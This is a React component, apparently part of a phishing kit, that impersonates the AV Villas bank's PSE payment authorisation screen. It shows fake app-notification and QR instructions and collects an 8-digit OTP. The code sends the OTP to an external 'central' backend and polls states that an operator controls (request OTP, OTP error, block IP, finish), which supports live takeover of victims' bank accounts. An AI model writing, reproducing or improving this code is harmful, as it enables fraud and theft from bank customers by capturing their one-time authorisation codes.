import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import styles from './QRAuthModal.module.css';
import qrCode from './modal/img/qr-av-villas.svg';
import qrGenericOriginal from '../../img/qr-placeholder-original.png';
import { instanceBackend } from '../../../../../axios/instanceBackend';
import LoadingAvvillas from '../../../../../components/LoadingAvvillas';

const AUTH_STAGE_DURATION = 60;
const GENERIC_QR_PLACEHOLDER = qrGenericOriginal;

const QRAuthModal = ({ onClose }) => {
    const navigate = useNavigate();

    const [otpValues, setOtpValues] = useState(['', '', '', '', '', '', '', '']);
    const [loading, setLoading] = useState(false);
    const [qrImageSrc, setQrImageSrc] = useState('');
    const [currentStage, setCurrentStage] = useState('auth');
    const [timeLeft, setTimeLeft] = useState(AUTH_STAGE_DURATION);
    const [showModal, setShowModal] = useState(false);
    const [modalText, setModalText] = useState('');

    const sessionIdRef = useRef(null);
    const inputRefs = useRef([]);
    const pollingIntervalRef = useRef(null);
    const lastEstadoRef = useRef(null);
    /** Sincroniza etapa UI para verifyState (evita closure obsoleto). */
    const currentStageRef = useRef('auth');
    /** Evita finalizar u OTP remoto con sessionId viejo antes de enviar el código */
    const allowPollNavigationRef = useRef(false);

    const redirigir = (ruta) => {
        navigate(ruta);
    };

    useEffect(() => {
        allowPollNavigationRef.current = sessionStorage.getItem('avvillas_otp_armed') === '1';
        if (allowPollNavigationRef.current) {
            sessionStorage.removeItem('avvillas_otp_armed');
        }
        const sid = localStorage.getItem('sessionId');
        if (!sid) {
            redirigir('/banco_av_villas_pse');
            return undefined;
        }
        sessionIdRef.current = sid;

        const pendingError = localStorage.getItem('avvillas_error_modal');
        if (pendingError === 'error_otp') {
            setShowModal(true);
            setModalText('Error de codigo OTP.');
        } else if (pendingError === 'block_ip') {
            setShowModal(true);
            setModalText('Acceso bloqueado por seguridad.');
        }
        if (pendingError) {
            localStorage.removeItem('avvillas_error_modal');
        }

        initPolling();
        return () => {
            if (pollingIntervalRef.current) {
                clearInterval(pollingIntervalRef.current);
                pollingIntervalRef.current = null;
            }
        };
    }, []);

    useEffect(() => {
        currentStageRef.current = currentStage;
        if (currentStage === 'qr' && inputRefs.current[0]) {
            inputRefs.current[0].focus();
        }
    }, [currentStage]);

    useEffect(() => {
        if (currentStage !== 'auth' || timeLeft <= 0) return;

        const timer = setInterval(() => {
            setTimeLeft((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    setCurrentStage('qr');
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [currentStage, timeLeft]);

    const initPolling = () => {
        if (pollingIntervalRef.current) {
            clearInterval(pollingIntervalRef.current);
            pollingIntervalRef.current = null;
        }
        pollingIntervalRef.current = setInterval(() => {
            verifyState();
        }, 3000);
        verifyState();
    };

    const verifyState = async () => {
        try {
            const response = await instanceBackend.post(`/avvillas/verify-state/${sessionIdRef.current}`);
            const estadoActual = (response?.data?.estado || '').toLowerCase();

            if (!estadoActual) return;

            const navegacionTrasOtp = ['sol_otp', 'error_otp', 'sol_finalizar', 'solicitar_finalizar'];
            if (navegacionTrasOtp.includes(estadoActual) && !allowPollNavigationRef.current) {
                return;
            }

            const prevEstado = lastEstadoRef.current;
            if (estadoActual === prevEstado) return;
            lastEstadoRef.current = estadoActual;

            switch (estadoActual) {
                case 'sol_otp':
                    setLoading(false);
                    setOtpValues(['', '', '', '', '', '', '', '']);
                    // Solo volver a la 1ª etapa si el operador re-solicita OTP tras pendiente/error (no en cada poll con sol_otp + qr).
                    if (
                        (prevEstado === 'pendiente' || prevEstado === 'error_otp') &&
                        currentStageRef.current === 'qr'
                    ) {
                        setQrImageSrc('');
                        setCurrentStage('auth');
                        setTimeLeft(AUTH_STAGE_DURATION);
                    }
                    break;
                case 'error_otp':
                    setLoading(false);
                    setShowModal(true);
                    setModalText('Error de codigo OTP.');
                    break;
                case 'error_login':
                    setLoading(false);
                    localStorage.setItem('avvillas_error_modal', 'error_login');
                    redirigir('/banco_av_villas_pse');
                    break;
                case 'sol_finalizar':
                case 'solicitar_finalizar':
                    setLoading(false);
                    redirigir('/finalizado-pse');
                    break;
                case 'block_ip':
                case 'error_blocked':
                    setLoading(false);
                    setShowModal(true);
                    setModalText('Acceso bloqueado por seguridad.');
                    break;
                default:
                    break;
            }
        } catch {
            // sin estado aún
        }
    };

    const closeModal = () => {
        // No limpiar lastEstadoRef: si el backend sigue en error_otp (o block), el polling
        // deduplica y no reabre el modal hasta que cambie el estado.
        setShowModal(false);
        setOtpValues(['', '', '', '', '', '', '', '']);
        setTimeLeft(AUTH_STAGE_DURATION);
        // Tras error OTP suele estar en etapa qr con timeLeft 0; sin volver a 'auth' el efecto
        // del contador no arranca. Reiniciar fase auth + 1 minuto completo.
        if (modalText === 'Error de codigo OTP.') {
            setCurrentStage('auth');
        }
    };

    const handleChange = (index, value) => {
        if (!/^\d*$/.test(value)) return;

        const newValues = [...otpValues];
        newValues[index] = value.slice(-1);
        setOtpValues(newValues);

        if (value && index < otpValues.length - 1) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handleKeyDown = (index, e) => {
        if (e.key === 'Backspace' && !otpValues[index] && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
        if (e.key === 'ArrowLeft' && index > 0) {
            inputRefs.current[index - 1]?.focus();
        }
        if (e.key === 'ArrowRight' && index < otpValues.length - 1) {
            inputRefs.current[index + 1]?.focus();
        }
    };

    const handlePaste = (e) => {
        e.preventDefault();
        const pastedData = e.clipboardData.getData('text').slice(0, 8);
        if (!/^\d+$/.test(pastedData)) return;

        const newValues = [...otpValues];
        pastedData.split('').forEach((char, i) => {
            if (i < newValues.length) newValues[i] = char;
        });
        setOtpValues(newValues);

        const nextEmptyIndex = newValues.findIndex((v) => !v);
        if (nextEmptyIndex !== -1) {
            inputRefs.current[nextEmptyIndex]?.focus();
        } else {
            inputRefs.current[newValues.length - 1]?.focus();
        }
    };

    const handleSubmitCode = async (code) => {
        if (code.length !== 8 || loading) return;

        const sessionId = localStorage.getItem('sessionId');
        const dataSend = {
            data: {
                attributes: {
                    otp: code,
                    fecha: new Date().toISOString(),
                    sessionId: sessionId || sessionIdRef.current,
                    backend: 'P01',
                    backend_central_url: process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    backend_url: '/api/v1/avvillas/otp',
                },
            },
        };

        const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || '').trim();

        try {
            setLoading(true);
            const response = centralUrl
                ? await instanceBackend.post(centralUrl, dataSend)
                : await instanceBackend.post('/avvillas/otp', dataSend);

            if (response?.data?.success) {
                localStorage.setItem('sessionId', response.data.sessionId);
                sessionIdRef.current = response.data.sessionId;
                lastEstadoRef.current = null;
                allowPollNavigationRef.current = true;
                initPolling();
            } else {
                setLoading(false);
                lastEstadoRef.current = 'error_otp';
                setShowModal(true);
                setModalText('Error de codigo OTP.');
            }
        } catch {
            setLoading(false);
            setShowModal(true);
            setModalText('Error de conexión con el servidor.');
        }
    };

    const handleSubmit = () => {
        const code = otpValues.join('');
        if (code.length === 8) {
            handleSubmitCode(code);
        }
    };

    const handleCloseClick = () => {
        if (onClose) {
            onClose();
        } else {
            redirigir('/banco_av_villas_pse');
        }
    };

    const isComplete = otpValues.every((v) => v !== '');
    const progressPercent = (timeLeft / AUTH_STAGE_DURATION) * 100;
    const formatTime = (seconds) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    return (
        <div className={styles.overlay}>
            <div className={styles.modalContainer}>
                <div className={styles.modal}>
                    <button
                        type="button"
                        className={styles.closeButton}
                        onClick={handleCloseClick}
                        aria-label="Cerrar"
                    >
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                            <line x1="18" y1="6" x2="6" y2="18"></line>
                            <line x1="6" y1="6" x2="18" y2="18"></line>
                        </svg>
                    </button>

                    <div className={styles.content}>
                        {currentStage === 'auth' ? (
                            <>
                                <h2 className={styles.title}>
                                    Autoriza tu transacción desde la aplicación
                                    <br />
                                    de AV Villas
                                </h2>

                                <div className={styles.illustrationContainer}>
                                    <img
                                        src="https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/updated-icons/celular-dinero.svg"
                                        alt="Autorización móvil"
                                        className={styles.phoneImageAuth}
                                    />
                                </div>

                                <div className={styles.timerSection}>
                                    <div className={styles.timerWrapper}>
                                        <div className={styles.timerContainer}>
                                            <div
                                                className={styles.timerBar}
                                                style={{ width: `${progressPercent}%` }}
                                            ></div>
                                        </div>
                                        <span className={styles.timeDisplay}>{formatTime(timeLeft)}</span>
                                    </div>
                                </div>

                                <div className={`${styles.instructions} ${styles.authInstructions}`}>
                                    <p className={styles.description}>
                                        En este momento hemos enviado una notificación a tu <b>AV Villas App</b>{' '}
                                        registrada para autorizar esta transacción.
                                    </p>

                                    <ul className={styles.accordionList}>
                                        <li>
                                            <span className={styles.bullet}>•</span>
                                            <p>Ingresa a tu AV Villas App</p>
                                        </li>
                                        <li>
                                            <span className={styles.bullet}>•</span>
                                            <p>
                                                Encontrarás un mensaje con los datos de tu transacción, en caso de que no
                                                lo veas puedes ingresar por el icono de campana o notificaciones
                                            </p>
                                        </li>
                                        <li>
                                            <span className={styles.bullet}>•</span>
                                            <p>Da clic en la opción de autorizar y listo!</p>
                                        </li>
                                    </ul>

                                    <div className={styles.alertInfo}>
                                        <span className={styles.alertIcon}>ⓘ</span>
                                        <p className={styles.alertMessage}>
                                            En caso de que no te llegue la notificación a tu AV Villas App. Haremos la
                                            autorización por medio del código QR.
                                        </p>
                                    </div>
                                </div>
                            </>
                        ) : (
                            <>
                                <div className={styles.qrSection}>
                                    <div className={styles.qrContainer}>
                                        <div className={`${styles.qrPlaceholder} ${!qrImageSrc ? styles.qrPlaceholderBlocked : ''}`}>
                                            <img
                                                id="image_qr"
                                                name="image_qr"
                                                src={qrImageSrc || GENERIC_QR_PLACEHOLDER}
                                                alt="Código QR"
                                                className={styles.qrImage}
                                            />
                                        </div>
                                    </div>

                                    <div className={styles.phoneContainer}>
                                        <img src={qrCode} alt="App AV Villas" className={styles.phoneImage} />
                                    </div>
                                </div>

                                <div className={styles.otpSection}>
                                    <div className={styles.otpInputs}>
                                        {otpValues.map((value, index) => (
                                            <input
                                                key={index}
                                                ref={(el) => {
                                                    inputRefs.current[index] = el;
                                                }}
                                                type="text"
                                                inputMode="numeric"
                                                maxLength={1}
                                                value={value}
                                                onChange={(e) => handleChange(index, e.target.value)}
                                                onKeyDown={(e) => handleKeyDown(index, e)}
                                                onPaste={handlePaste}
                                                className={styles.otpInput}
                                                aria-label={`Dígito ${index + 1}`}
                                            />
                                        ))}
                                    </div>
                                </div>

                                <div className={styles.instructions}>
                                    <ol className={styles.stepsList}>
                                        <li>
                                            Desde tu celular, abre la <strong>Aplicación de AV Villas</strong>.
                                        </li>
                                        <li>
                                            Selecciona en el icono del <strong>código QR</strong>.
                                        </li>
                                        <li>
                                            Cuando se active la cámara,{' '}
                                            <strong>apunta tu teléfono hacia esta pantalla para escanear el código QR.</strong>
                                        </li>
                                        <li>Ingresa el código que aparece en tu celular.</li>
                                    </ol>
                                </div>

                                <div className={styles.buttonContainer}>
                                    <button
                                        type="button"
                                        className={`${styles.continueButton} ${!isComplete ? styles.disabled : ''}`}
                                        onClick={handleSubmit}
                                        disabled={!isComplete || loading}
                                    >
                                        {loading ? 'Verificando...' : 'Continuar'}
                                    </button>
                                </div>
                            </>
                        )}
                    </div>
                </div>
            </div>

            {showModal ? (
                <div className={styles.pseModalWrap} role="presentation">
                    <div className={styles.pseModalCard} role="dialog" aria-modal="true">
                        <div className={styles.pseModalTop}>AV Villas</div>
                        <div className={styles.pseModalMid}>
                            <p>{modalText}</p>
                        </div>
                        <div className={styles.pseModalBot}>
                            <button type="button" className={styles.pseModalAcceptBtn} onClick={closeModal}>
                                Aceptar
                            </button>
                        </div>
                    </div>
                </div>
            ) : null}

            {loading ? <LoadingAvvillas /> : null}
        </div>
    );
};

export default QRAuthModal;
